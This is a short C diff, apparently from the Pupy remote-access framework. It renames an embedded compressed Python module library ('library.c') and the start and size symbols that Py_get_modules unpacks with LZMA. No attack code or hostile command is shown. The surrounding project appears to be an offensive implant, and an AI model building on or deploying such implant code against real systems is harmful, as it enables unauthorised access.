@@ -28,7 +28,7 @@ extern const DWORD dwPupyArch;
 
 #include "revision.h"
 
-#include "resources_library_compressed_string_txt.c"
+#include "library.c"
 #include "lzmaunpack.c"
 
 static PyObject *Py_on_exit_session_callback = NULL;
@@ -61,8 +61,8 @@ static PyObject *Py_set_exit_session_callback(PyObject *self, PyObject *args)
 static PyObject *Py_get_modules(PyObject *self, PyObject *args)
 {
 	return PyObject_lzmaunpack(
-		resources_library_compressed_string_txt_start,
-		resources_library_compressed_string_txt_size
+		library_c_start,
+		library_c_size
 	);
 }
 
